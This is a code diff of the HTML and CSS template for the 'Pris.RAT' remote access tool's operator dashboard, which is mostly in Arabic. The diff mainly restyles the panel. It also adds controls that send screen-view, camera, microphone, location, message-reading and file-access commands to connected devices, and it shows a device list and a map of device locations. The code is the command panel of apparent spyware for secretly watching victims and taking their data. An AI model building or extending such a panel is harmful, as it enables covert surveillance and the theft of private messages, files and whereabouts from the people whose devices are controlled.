@@ -4,273 +4,1063 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Pris.RAT — لوحة التحكم</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Tahoma', sans-serif; }
-body { background: #0a0a0f; color: #fff; min-height: 100vh; background-image: radial-gradient(circle at 10% 20%, rgba(255,0,51,0.08) 0%, transparent 40%), radial-gradient(circle at 90% 80%, rgba(0,100,255,0.05) 0%, transparent 40%); }
-.layout { display: flex; min-height: 100vh; }
-.sidebar { width: 240px; background: linear-gradient(180deg, rgba(15,5,15,0.98), rgba(10,10,20,0.98)); border-left: 2px solid #ff0033; padding: 20px 0; position: fixed; top: 0; right: 0; bottom: 0; z-index: 100; display: flex; flex-direction: column; box-shadow: -5px 0 30px rgba(255,0,51,0.2); }
-.sidebar-logo { display: flex; align-items: center; gap: 12px; padding: 0 20px 20px; border-bottom: 1px solid #222; margin-bottom: 15px; }
-.sidebar-logo-icon { width: 45px; height: 45px; background: radial-gradient(circle, rgba(255,0,51,0.3), rgba(100,0,20,0.8)); border: 2px solid #ff0033; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; box-shadow: 0 0 15px rgba(255,0,51,0.6); }
-.sidebar-logo-text h2 { font-size: 18px; letter-spacing: 2px; }
-.sidebar-logo-text h2 span { color: #ff0033; }
-.sidebar-logo-text p { font-size: 9px; color: #666; letter-spacing: 2px; }
-.sidebar-nav { flex: 1; padding: 0 10px; }
-.nav-item { display: flex; align-items: center; gap: 12px; padding: 12px 15px; color: #888; text-decoration: none; border-radius: 10px; margin-bottom: 5px; font-size: 14px; transition: all 0.3s; cursor: pointer; border: 1px solid transparent; }
-.nav-item:hover { background: rgba(255,0,51,0.1); color: #fff; }
-.nav-item.active { background: linear-gradient(90deg, rgba(255,0,51,0.2), rgba(255,0,51,0.05)); color: #fff; border-color: #ff0033; box-shadow: 0 0 15px rgba(255,0,51,0.3); }
-.nav-item .ico { font-size: 20px; width: 24px; text-align: center; }
-.nav-item .badge { margin-right: auto; background: #ff0033; color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
-.sidebar-footer { padding: 15px 20px; border-top: 1px solid #222; font-size: 10px; color: #444; text-align: center; letter-spacing: 1px; }
-.main-content { flex: 1; margin-right: 240px; padding: 20px; }
-.header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: linear-gradient(90deg, rgba(20,0,10,0.95), rgba(10,10,20,0.95)); border: 2px solid #ff0033; border-radius: 12px; margin-bottom: 20px; box-shadow: 0 0 25px rgba(255,0,51,0.2); flex-wrap: wrap; gap: 10px; }
-.header-title { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: bold; }
-.header-right { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-.status-pill { display: flex; align-items: center; gap: 6px; background: rgba(0,255,0,0.08); border: 1px solid #0f0; padding: 6px 14px; border-radius: 20px; color: #0f0; font-size: 12px; }
-.dot { width: 8px; height: 8px; border-radius: 50%; background: #0f0; box-shadow: 0 0 10px #0f0; animation: pulse 2s infinite; }
-@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-.time-pill { background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 6px 14px; border-radius: 20px; font-size: 12px; color: #aaa; }
-.user-pill { display: flex; align-items: center; gap: 8px; background: rgba(255,0,51,0.1); border: 1px solid #ff0033; padding: 6px 14px; border-radius: 20px; font-size: 12px; }
-.logout-btn { background: linear-gradient(135deg, #ff0033, #990000); color: #fff; border: none; padding: 8px 18px; border-radius: 8px; text-decoration: none; font-size: 13px; font-weight: bold; cursor: pointer; transition: all 0.3s; }
-.logout-btn:hover { box-shadow: 0 0 20px rgba(255,0,51,0.8); }
-.stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 20px; }
-.stat-card { background: linear-gradient(135deg, rgba(20,20,30,0.98), rgba(30,10,20,0.98)); border: 2px solid #333; border-radius: 12px; padding: 20px; position: relative; overflow: hidden; transition: all 0.3s; }
-.stat-card::before { content: ''; position: absolute; top: 0; right: 0; width: 4px; height: 100%; background: #ff0033; box-shadow: 0 0 15px #ff0033; }
-.stat-card.green::before { background: #0f0; box-shadow: 0 0 15px #0f0; }
-.stat-card.red::before { background: #f00; box-shadow: 0 0 15px #f00; }
-.stat-card:hover { border-color: #ff0033; transform: translateY(-3px); box-shadow: 0 10px 30px rgba(255,0,51,0.2); }
-.stat-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-.stat-icon { width: 45px; height: 45px; background: rgba(255,0,51,0.1); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
-.stat-card.green .stat-icon { background: rgba(0,255,0,0.1); }
-.stat-card.red .stat-icon { background: rgba(255,0,0,0.1); }
-.stat-num { font-size: 36px; font-weight: bold; color: #ff0033; text-shadow: 0 0 15px rgba(255,0,51,0.7); }
-.stat-card.green .stat-num { color: #0f0; text-shadow: 0 0 15px rgba(0,255,0,0.7); }
-.stat-card.red .stat-num { color: #f00; text-shadow: 0 0 15px rgba(255,0,0,0.7); }
-.stat-label { color: #888; font-size: 12px; letter-spacing: 1px; }
-.section-title { display: flex; align-items: center; gap: 10px; font-size: 16px; margin: 20px 0 12px; padding: 10px 15px; background: linear-gradient(90deg, rgba(255,0,51,0.15), transparent); border-right: 4px solid #ff0033; border-radius: 8px; }
-.section-title .count { background: #ff0033; color: #fff; padding: 2px 10px; border-radius: 10px; font-size: 12px; margin-right: auto; }
-.device-list { display: flex; flex-direction: column; gap: 10px; }
-.device-card { background: linear-gradient(135deg, rgba(20,20,30,0.98), rgba(15,15,25,0.98)); border: 2px solid #333; border-radius: 12px; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; transition: all 0.3s; cursor: pointer; gap: 15px; }
-.device-card:hover { border-color: #ff0033; transform: translateX(-5px); box-shadow: 0 0 25px rgba(255,0,51,0.3); }
-.device-card.selected { border-color: #0f0; box-shadow: 0 0 25px rgba(0,255,0,0.4); }
-.device-card.online { border-right: 4px solid #0f0; }
-.device-card.offline { border-right: 4px solid #f00; opacity: 0.55; }
-.device-left { display: flex; align-items: center; gap: 15px; flex: 1; min-width: 0; }
-.device-icon-box { width: 50px; height: 50px; background: linear-gradient(135deg, rgba(255,0,51,0.15), rgba(100,0,20,0.15)); border: 2px solid #ff0033; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; flex-shrink: 0; box-shadow: 0 0 10px rgba(255,0,51,0.3); }
-.device-card.online .device-icon-box { border-color: #0f0; box-shadow: 0 0 10px rgba(0,255,0,0.3); }
-.device-info { flex: 1; min-width: 0; }
-.device-name { font-size: 15px; color: #fff; font-weight: bold; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.device-meta { font-size: 11px; color: #888; margin-top: 6px; display: flex; gap: 12px; flex-wrap: wrap; }
-.device-meta span { display: flex; align-items: center; gap: 4px; white-space: nowrap; }
-.status-badge-dev { padding: 6px 14px; border-radius: 15px; font-size: 11px; font-weight: bold; flex-shrink: 0; }
-.status-online { background: rgba(0,255,0,0.15); color: #0f0; border: 1px solid #0f0; }
-.status-offline { background: rgba(255,0,0,0.15); color: #f00; border: 1px solid #f00; }
-.empty { text-align: center; padding: 60px 20px; color: #666; font-size: 15px; background: rgba(20,20,25,0.5); border-radius: 12px; border: 2px dashed #333; }
-.empty .big { font-size: 70px; margin-bottom: 15px; opacity: 0.4; }
-.controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 12px; margin-top: 15px; }
-.ctrl-btn { background: linear-gradient(135deg, rgba(255,0,51,0.12), rgba(153,0,0,0.12)); border: 2px solid #ff0033; border-radius: 12px; padding: 20px 15px; color: #fff; font-size: 13px; font-weight: bold; cursor: pointer; transition: all 0.3s; display: flex; flex-direction: column; align-items: center; gap: 10px; box-shadow: 0 0 15px rgba(255,0,51,0.15); font-family: inherit; text-align: center; }
-.ctrl-btn:hover { background: linear-gradient(135deg, rgba(255,0,51,0.4), rgba(153,0,0,0.4)); box-shadow: 0 0 30px rgba(255,0,51,0.7); transform: translateY(-3px); }
-.ctrl-btn:active { transform: translateY(0) scale(0.95); }
-.ctrl-btn .ico { font-size: 32px; filter: drop-shadow(0 0 8px rgba(255,0,51,0.8)); }
-.ctrl-btn.red { background: linear-gradient(135deg, rgba(255,0,0,0.25), rgba(100,0,0,0.25)); }
-.ctrl-btn.green { background: linear-gradient(135deg, rgba(0,255,0,0.15), rgba(0,100,0,0.15)); border-color: #0f0; }
-.ctrl-btn.green .ico { filter: drop-shadow(0 0 8px rgba(0,255,0,0.8)); }
-.ctrl-btn.blue { background: linear-gradient(135deg, rgba(0,150,255,0.15), rgba(0,50,150,0.15)); border-color: #0099ff; }
-.ctrl-btn.blue .ico { filter: drop-shadow(0 0 8px rgba(0,150,255,0.8)); }
-.toast { position: fixed; top: 20px; left: 20px; padding: 15px 25px; border-radius: 10px; font-weight: bold; z-index: 10001; font-size: 13px; animation: slideIn 0.3s; box-shadow: 0 5px 25px rgba(0,0,0,0.6); border: 2px solid; max-width: 300px; }
-.toast.success { background: rgba(0,255,0,0.15); color: #0f0; border-color: #0f0; }
-.toast.error { background: rgba(255,0,0,0.15); color: #f00; border-color: #f00; }
-.toast.info { background: rgba(255,0,51,0.15); color: #ff0033; border-color: #ff0033; }
-@keyframes slideIn { from { transform: translateX(-100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
-.menu-toggle { display: none; background: rgba(255,0,51,0.2); border: 2px solid #ff0033; color: #fff; width: 40px; height: 40px; border-radius: 8px; font-size: 20px; cursor: pointer; }
-@media (max-width: 900px) {
-  .sidebar { transform: translateX(100%); transition: transform 0.3s; }
+
+:root {
+  --bg: #0a0a0f;
+  --panel: #0f1117;
+  --panel-2: #14161d;
+  --border: #1e212b;
+  --red: #ff0033;
+  --red-dim: rgba(255,0,51,0.15);
+  --green: #00ff88;
+  --green-dim: rgba(0,255,136,0.15);
+  --blue: #0099ff;
+  --yellow: #ffaa00;
+  --text: #e8e8ea;
+  --text-dim: #7a7e8a;
+}
+
+[data-theme="light"] {
+  --bg: #f0f2f5;
+  --panel: #ffffff;
+  --panel-2: #f8f9fb;
+  --border: #e1e4e8;
+  --text: #1a1a1a;
+  --text-dim: #6a6e7a;
+}
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  font-size: 14px;
+  transition: background 0.3s, color 0.3s;
+}
+
+.layout {
+  display: grid;
+  grid-template-columns: 220px 1fr;
+  min-height: 100vh;
+}
+
+/* ==================== SIDEBAR ==================== */
+.sidebar {
+  background: var(--panel);
+  border-left: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  position: sticky;
+  top: 0;
+  height: 100vh;
+  overflow-y: auto;
+}
+
+.sidebar-logo {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 18px;
+  border-bottom: 1px solid var(--border);
+}
+
+.sidebar-logo-icon {
+  width: 42px;
+  height: 42px;
+  background: radial-gradient(circle, var(--red-dim), transparent);
+  border: 2px solid var(--red);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  box-shadow: 0 0 15px rgba(255,0,51,0.5);
+}
+
+.sidebar-logo-text h2 {
+  font-size: 17px;
+  letter-spacing: 1px;
+  color: var(--text);
+}
+.sidebar-logo-text h2 span { color: var(--red); }
+.sidebar-logo-text p {
+  font-size: 8px;
+  color: var(--text-dim);
+  letter-spacing: 2px;
+}
+
+.sidebar-nav {
+  flex: 1;
+  padding: 12px 8px;
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 11px 14px;
+  color: var(--text-dim);
+  text-decoration: none;
+  border-radius: 8px;
+  margin-bottom: 4px;
+  font-size: 13px;
+  cursor: pointer;
+  transition: all 0.2s;
+  border-right: 3px solid transparent;
+}
+
+.nav-item:hover {
+  background: rgba(255,0,51,0.05);
+  color: var(--text);
+}
+
+.nav-item.active {
+  background: var(--red-dim);
+  color: var(--text);
+  border-right-color: var(--red);
+}
+
+.nav-item .ico { font-size: 18px; width: 22px; text-align: center; }
+.nav-item .badge {
+  margin-right: auto;
+  background: var(--red);
+  color: #fff;
+  padding: 2px 8px;
+  border-radius: 10px;
+  font-size: 10px;
+  font-weight: bold;
+}
+
+.sidebar-footer {
+  padding: 15px;
+  border-top: 1px solid var(--border);
+  font-size: 10px;
+  color: var(--text-dim);
+  text-align: center;
+}
+
+/* ==================== MAIN ==================== */
+.main {
+  padding: 15px 20px;
+  overflow-x: hidden;
+}
+
+/* ==================== TOP HEADER ==================== */
+.top-header {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  padding: 15px 20px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  margin-bottom: 15px;
+  flex-wrap: wrap;
+}
+
+.top-logo {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.top-logo-icon {
+  width: 40px;
+  height: 40px;
+  background: radial-gradient(circle, var(--red-dim), transparent);
+  border: 2px solid var(--red);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+}
+
+.top-logo-text h1 {
+  font-size: 20px;
+  letter-spacing: 1.5px;
+}
+.top-logo-text h1 span { color: var(--red); }
+.top-logo-text p {
+  font-size: 8px;
+  color: var(--text-dim);
+  letter-spacing: 2px;
+}
+
+.top-info {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-right: auto;
+  flex-wrap: wrap;
+}
+
+.info-pill {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 14px;
+  background: var(--panel-2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  font-size: 12px;
+}
+
+.info-pill.online {
+  border-color: var(--green);
+  color: var(--green);
+}
+
+.dot {
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  background: var(--green);
+  box-shadow: 0 0 10px var(--green);
+  animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+  0%,100% { opacity: 1; }
+  50% { opacity: 0.4; }
+}
+
+.info-pill .icon { font-size: 14px; }
+
+.user-pill {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 14px;
+  background: var(--red-dim);
+  border: 1px solid var(--red);
+  border-radius: 8px;
+  font-size: 12px;
+}
+
+.logout-btn {
+  background: var(--red);
+  color: #fff;
+  border: none;
+  padding: 8px 16px;
+  border-radius: 8px;
+  font-size: 12px;
+  font-weight: bold;
+  cursor: pointer;
+  text-decoration: none;
+}
+
+/* ==================== STATS GRID ==================== */
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 12px;
+  margin-bottom: 15px;
+}
+
+.stat-card {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 18px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  position: relative;
+  overflow: hidden;
+}
+
+.stat-card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 3px;
+  height: 100%;
+  background: var(--red);
+}
+
+.stat-card.green::before { background: var(--green); }
+.stat-card.red::before { background: #ff3333; }
+.stat-card.yellow::before { background: var(--yellow); }
+
+.stat-icon {
+  width: 48px;
+  height: 48px;
+  border-radius: 10px;
+  background: var(--red-dim);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 22px;
+  flex-shrink: 0;
+}
+
+.stat-card.green .stat-icon { background: var(--green-dim); }
+.stat-card.red .stat-icon { background: rgba(255,51,51,0.15); }
+.stat-card.yellow .stat-icon { background: rgba(255,170,0,0.15); }
+
+.stat-info { flex: 1; min-width: 0; }
+.stat-info .label {
+  font-size: 11px;
+  color: var(--text-dim);
+  margin-bottom: 4px;
+}
+.stat-info .num {
+  font-size: 24px;
+  font-weight: bold;
+  color: var(--text);
+  line-height: 1;
+}
+.stat-info .trend {
+  font-size: 10px;
+  margin-top: 4px;
+}
+.trend.up { color: var(--green); }
+.trend.down { color: #ff3333; }
+
+/* ==================== MAIN GRID ==================== */
+.main-grid {
+  display: grid;
+  grid-template-columns: 1.5fr 1fr 0.8fr;
+  gap: 12px;
+  margin-bottom: 12px;
+}
+
+.panel {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  overflow: hidden;
+}
+
+.panel-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 15px;
+  border-bottom: 1px solid var(--border);
+}
+
+.panel-title {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 13px;
+  font-weight: bold;
+}
+
+.panel-title .icon { font-size: 16px; }
+
+.panel-action {
+  font-size: 11px;
+  color: var(--red);
+  cursor: pointer;
+  text-decoration: none;
+}
+
+.panel-body { padding: 12px 15px; }
+
+/* ==================== DEVICES TABLE ==================== */
+.devices-table {
+  width: 100%;
+  font-size: 12px;
+}
+
+.devices-table thead th {
+  text-align: right;
+  padding: 8px 6px;
+  color: var(--text-dim);
+  font-weight: normal;
+  font-size: 10px;
+  border-bottom: 1px solid var(--border);
+  text-transform: uppercase;
+}
+
+.devices-table tbody tr {
+  border-bottom: 1px solid var(--border);
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+.devices-table tbody tr:hover {
+  background: rgba(255,0,51,0.05);
+}
+
+.devices-table tbody tr.selected {
+  background: rgba(0,255,136,0.08);
+}
+
+.devices-table tbody tr:last-child { border-bottom: none; }
+
+.devices-table td {
+  padding: 10px 6px;
+  vertical-align: middle;
+}
+
+.dev-icon {
+  width: 32px;
+  height: 32px;
+  background: var(--red-dim);
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+}
+
+.dev-info .name {
+  font-weight: bold;
+  color: var(--text);
+  font-size: 12px;
+}
+.dev-info .sub {
+  font-size: 10px;
+  color: var(--text-dim);
+  margin-top: 2px;
+}
+
+.status-tag {
+  padding: 3px 10px;
+  border-radius: 10px;
+  font-size: 10px;
+  font-weight: bold;
+}
+.status-tag.online {
+  background: var(--green-dim);
+  color: var(--green);
+  border: 1px solid var(--green);
+}
+.status-tag.offline {
+  background: rgba(255,51,51,0.15);
+  color: #ff3333;
+  border: 1px solid #ff3333;
+}
+
+.chevron {
+  color: var(--text-dim);
+  font-size: 16px;
+  cursor: pointer;
+}
+
+/* ==================== WORLD MAP ==================== */
+#worldMap {
+  width: 100%;
+  height: 220px;
+  border-radius: 8px;
+  background: #0a0f18;
+}
+
+.location-list {
+  margin-top: 10px;
+  max-height: 180px;
+  overflow-y: auto;
+}
+
+.loc-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 11px;
+}
+
+.loc-item:last-child { border-bottom: none; }
+
+.loc-flag {
+  width: 22px;
+  height: 15px;
+  border-radius: 2px;
+  flex-shrink: 0;
+}
+
+.loc-info { flex: 1; min-width: 0; }
+.loc-info .city {
+  color: var(--text);
+  font-weight: bold;
+  font-size: 11px;
+}
+.loc-info .model {
+  color: var(--text-dim);
+  font-size: 10px;
+  margin-top: 2px;
+}
+
+.loc-ip {
+  font-size: 10px;
+  color: var(--text-dim);
+  font-family: monospace;
+}
+
+/* ==================== SYSTEM STATUS ==================== */
+.sys-item {
+  margin-bottom: 12px;
+}
+.sys-item:last-child { margin-bottom: 0; }
+
+.sys-label {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 11px;
+  margin-bottom: 6px;
+}
+
+.sys-label .name {
+  color: var(--text);
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+.sys-label .icon { font-size: 13px; }
+.sys-label .val {
+  color: var(--text-dim);
+  font-weight: bold;
+}
+
+.progress {
+  height: 6px;
+  background: var(--panel-2);
+  border-radius: 3px;
+  overflow: hidden;
+}
+
+.progress-bar {
+  height: 100%;
+  border-radius: 3px;
+  background: var(--red);
+  transition: width 0.5s;
+}
+
+.progress-bar.green { background: var(--green); }
+.progress-bar.blue { background: var(--blue); }
+.progress-bar.yellow { background: var(--yellow); }
+
+/* ==================== QUICK ACTIONS ==================== */
+.quick-actions {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 8px;
+}
+
+.qa-btn {
+  background: var(--panel-2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 15px 10px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+  color: var(--text);
+  font-size: 11px;
+  font-family: inherit;
+}
+
+.qa-btn:hover {
+  border-color: var(--red);
+  background: var(--red-dim);
+  transform: translateY(-2px);
+}
+
+.qa-btn .ico { font-size: 22px; }
+
+/* ==================== BOTTOM GRID ==================== */
+.bottom-grid {
+  display: grid;
+  grid-template-columns: 1fr 1.2fr 1fr;
+  gap: 12px;
+}
+
+/* ==================== ACTIVITY ==================== */
+.activity-list {
+  max-height: 200px;
+  overflow-y: auto;
+}
+
+.activity-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 9px 0;
+  border-bottom: 1px solid var(--border);
+  font-size: 11px;
+}
+
+.activity-item:last-child { border-bottom: none; }
+
+.activity-icon {
+  width: 28px;
+  height: 28px;
+  border-radius: 7px;
+  background: var(--red-dim);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 13px;
+  flex-shrink: 0;
+}
+
+.activity-info { flex: 1; min-width: 0; }
+.activity-info .text {
+  color: var(--text);
+  font-size: 11px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.activity-info .device {
+  color: var(--text-dim);
+  font-size: 10px;
+  margin-top: 2px;
+}
+
+.activity-time {
+  color: var(--text-dim);
+  font-size: 10px;
+  flex-shrink: 0;
+}
+
+/* ==================== QUICK NOTE ==================== */
+.note-box {
+  background: var(--panel-2);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 12px;
+  font-size: 11px;
+  color: var(--text-dim);
+  line-height: 1.6;
+  min-height: 100px;
+}
+
+.note-box textarea {
+  width: 100%;
+  background: transparent;
+  border: none;
+  color: var(--text);
+  font-family: inherit;
+  font-size: 12px;
+  resize: none;
+  outline: none;
+  min-height: 80px;
+}
+
+/* ==================== CHART ==================== */
+#trafficChart {
+  width: 100%;
+  height: 180px;
+}
+
+/* ==================== TOAST ==================== */
+.toast {
+  position: fixed;
+  top: 20px;
+  left: 20px;
+  padding: 12px 22px;
+  border-radius: 10px;
+  font-weight: bold;
+  z-index: 99999;
+  font-size: 13px;
+  border: 2px solid;
+  max-width: 300px;
+  animation: slideIn 0.3s;
+}
+.toast.success { background: rgba(0,255,136,0.15); color: var(--green); border-color: var(--green); }
+.toast.error { background: rgba(255,51,51,0.15); color: #ff3333; border-color: #ff3333; }
+.toast.info { background: rgba(255,0,51,0.15); color: var(--red); border-color: var(--red); }
+
+@keyframes slideIn {
+  from { transform: translateX(-100px); opacity: 0; }
+  to { transform: translateX(0); opacity: 1; }
+}
+
+/* ==================== REMOVE BTN ==================== */
+.remove-btn {
+  background: transparent;
+  border: none;
+  color: var(--text-dim);
+  cursor: pointer;
+  font-size: 14px;
+  padding: 4px 6px;
+  border-radius: 6px;
+  transition: all 0.2s;
+}
+.remove-btn:hover {
+  background: rgba(255,51,51,0.2);
+  color: #ff3333;
+}
+
+/* ==================== RESPONSIVE ==================== */
+.menu-toggle {
+  display: none;
+  background: var(--panel-2);
+  border: 1px solid var(--border);
+  color: var(--text);
+  width: 38px;
+  height: 38px;
+  border-radius: 8px;
+  font-size: 18px;
+  cursor: pointer;
+}
+
+@media (max-width: 1100px) {
+  .main-grid { grid-template-columns: 1fr; }
+  .bottom-grid { grid-template-columns: 1fr; }
+  .stats-grid { grid-template-columns: 1fr 1fr; }
+}
+
+@media (max-width: 800px) {
+  .layout { grid-template-columns: 1fr; }
+  .sidebar {
+    position: fixed;
+    right: 0;
+    top: 0;
+    bottom: 0;
+    z-index: 1000;
+    transform: translateX(100%);
+    transition: transform 0.3s;
+    width: 240px;
+  }
   .sidebar.open { transform: translateX(0); }
-  .main-content { margin-right: 0; padding: 10px; }
   .menu-toggle { display: flex; align-items: center; justify-content: center; }
-  .stats { grid-template-columns: repeat(3, 1fr); gap: 8px; }
-  .stat-card { padding: 12px 8px; }
-  .stat-num { font-size: 22px; }
-  .stat-icon { width: 35px; height: 35px; font-size: 18px; }
-  .stat-label { font-size: 10px; }
-  .controls { grid-template-columns: repeat(2, 1fr); gap: 8px; }
-  .ctrl-btn { padding: 15px 8px; font-size: 11px; }
-  .ctrl-btn .ico { font-size: 24px; }
-  .header-title { font-size: 15px; }
+  .stats-grid { grid-template-columns: 1fr; }
+  .devices-table { font-size: 10px; }
+  .devices-table thead th { font-size: 9px; padding: 6px 3px; }
+  .devices-table td { padding: 8px 3px; }
+  .top-header { padding: 10px; }
+  .main { padding: 10px; }
 }
 </style>
 </head>
 <body>
 
 <div class="layout">
+  <!-- SIDEBAR -->
   <aside class="sidebar" id="sidebar">
     <div class="sidebar-logo">
       <div class="sidebar-logo-icon">🐺</div>
       <div class="sidebar-logo-text">
         <h2>Pris.<span>RAT</span></h2>
-        <p>CONTROL · MANAGE</p>
+        <p>REMOTE ADMIN TOOL</p>
       </div>
     </div>
     <nav class="sidebar-nav">
-      <a class="nav-item active" onclick="showSection('devices')">
+      <a class="nav-item active" data-i18n="dashboard">
+        <span class="ico">🏠</span><span>الرئيسية</span>
+      </a>
+      <a class="nav-item" data-i18n="devices">
         <span class="ico">📱</span><span>الأجهزة</span>
         <span class="badge">{{ total }}</span>
       </a>
-      <a class="nav-item" onclick="cmdAndToast('camera','📷')">
+      <a class="nav-item" onclick="cmdAndToast('screen')">
+        <span class="ico">🖥️</span><span>عرض الشاشة</span>
+      </a>
+      <a class="nav-item" onclick="cmdAndToast('camera')">
         <span class="ico">📷</span><span>الكاميرا</span>
       </a>
-      <a class="nav-item" onclick="cmdAndToast('location','📍')">
+      <a class="nav-item" onclick="cmdAndToast('mic')">
+        <span class="ico">🎤</span><span>المايكروفون</span>
+      </a>
+      <a class="nav-item" onclick="cmdAndToast('location')">
         <span class="ico">📍</span><span>الموقع</span>
       </a>
-      <a class="nav-item" onclick="cmdAndToast('blackout','⬛')">
-        <span class="ico">⬛</span><span>الشاشة السوداء</span>
+      <a class="nav-item" onclick="cmdAndToast('messages')">
+        <span class="ico">💬</span><span>الرسائل</span>
+        <span class="badge">0</span>
+      </a>
+      <a class="nav-item" onclick="cmdAndToast('files')">
+        <span class="ico">📁</span><span>الملفات</span>
+      </a>
+      <a class="nav-item" onclick="window.location.href='/settings'">
+        <span class="ico">⚙️</span><span>الإعدادات</span>
       </a>
     </nav>
-    <div class="sidebar-footer">Powered by Pris.RAT © 2026</div>
+    <div class="sidebar-footer">
+      <div>Powered by</div>
+      <div style="color: var(--red); font-weight: bold; letter-spacing: 1px;">PRIS.RAT © 2026</div>
+    </div>
   </aside>
 
-  <main class="main-content">
-    <div class="header">
+  <!-- MAIN -->
+  <main class="main">
+
+    <!-- TOP HEADER -->
+    <div class="top-header">
       <button class="menu-toggle" onclick="toggleMenu()">☰</button>
-      <div class="header-title">📊 لوحة التحكم</div>
-      <div class="header-right">
-        <div class="status-pill"><div class="dot"></div><span>السيرفر متصل</span></div>
-        <div class="time-pill" id="clock">--:--</div>
-        <div class="user-pill">👤 {{ session_user or 'Admin' }}</div>
-        <a href="/logout" class="logout-btn">خروج</a>
+      <div class="top-logo">
+        <div class="top-logo-icon">🐺</div>
+        <div class="top-logo-text">
+          <h1>Pris.<span>RAT</span> 🇷🇺</h1>
+          <p>REMOTE ADMINISTRATION TOOL</p>
+        </div>
       </div>
+      <div class="top-info">
+        <div class="info-pill online">
+          <div class="dot"></div>
+          <span>Server Online</span>
+        </div>
+        <div class="info-pill">
+          <span class="icon">🕐</span>
+          <div>
+            <div id="clockDate" style="font-size: 9px; color: var(--text-dim);">--/--/----</div>
+            <div id="clockTime" style="font-size: 12px; font-weight: bold;">--:--:--</div>
+          </div>
+        </div>
+        <div class="user-pill">
+          <span>👤</span>
+          <div>
+            <div style="font-size: 9px; color: var(--text-dim);">Admin</div>
+            <div style="font-size: 11px; font-weight: bold;">Main Account</div>
+          </div>
+        </div>
+      </div>
+      <a href="/logout" class="logout-btn">Logout</a>
     </div>
 
-    <div class="stats">
+    <!-- STATS -->
+    <div class="stats-grid">
       <div class="stat-card">
-        <div class="stat-header"><div class="stat-icon">📱</div><div class="stat-num">{{ total }}</div></div>
-        <div class="stat-label">إجمالي الأجهزة</div>
+        <div class="stat-icon">📱</div>
+        <div class="stat-info">
+          <div class="label">Total Devices</div>
+          <div class="num">{{ total }}</div>
+          <div class="trend up">↑ إجمالي الأجهزة</div>
+        </div>
       </div>
       <div class="stat-card green">
-        <div class="stat-header"><div class="stat-icon">🟢</div><div class="stat-num">{{ online }}</div></div>
-        <div class="stat-label">متصل</div>
+        <div class="stat-icon">📶</div>
+        <div class="stat-info">
+          <div class="label">Online</div>
+          <div class="num">{{ online }}</div>
+          <div class="trend up" id="onlineTrend">↑ {{ online }}</div>
+        </div>
       </div>
       <div class="stat-card red">
-        <div class="stat-header"><div class="stat-icon">🔴</div><div class="stat-num">{{ offline }}</div></div>
-        <div class="stat-label">غير متصل</div>
+        <div class="stat-icon">📴</div>
